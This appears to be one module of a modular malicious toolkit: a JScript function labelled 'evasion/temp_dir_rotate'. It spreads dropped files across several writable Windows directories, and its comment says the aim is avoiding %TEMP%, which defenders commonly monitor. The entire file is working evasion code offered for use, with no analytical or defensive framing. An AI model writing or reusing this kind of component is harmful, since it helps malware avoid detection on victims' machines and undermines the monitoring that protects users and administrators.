// chunk: evasion/temp_dir_rotate
// depends: (none)
// provides: get_temp_dir
// format: jscript
// note: Rotates between multiple writable temp directories based on a hash.
//       Avoids concentrating artifacts in %TEMP% which is commonly monitored.

function get_temp_dir() {
    var sh = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var candidates = [
        sh.ExpandEnvironmentStrings("%TEMP%"),
        sh.ExpandEnvironmentStrings("%PUBLIC%"),
        sh.ExpandEnvironmentStrings("%PROGRAMDATA%"),
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Temp"
    ];
    /* Hash-based selection for deterministic-per-run variety */
    var hash = 0;
    var ts = "" + new Date().getTime();
    for (var i = 0; i < ts.length; i++) {
        hash = ((hash << 5) - hash + ts.charCodeAt(i)) & 0x7FFFFFFF;
    }
    var idx = hash % candidates.length;
    for (var j = 0; j < candidates.length; j++) {
        var path = candidates[(idx + j) % candidates.length];
        try {
            if (fso.FolderExists(path)) {
                /* Test write access */
                var testFile = path + "\\~tmp" + Math.floor(Math.random() * 9999);
                var tf = fso.CreateTextFile(testFile, true);
                tf.Close();
                fso.DeleteFile(testFile);
                return path;
            }
        } catch(e) {}
    }
    return sh.ExpandEnvironmentStrings("%TEMP%");
}
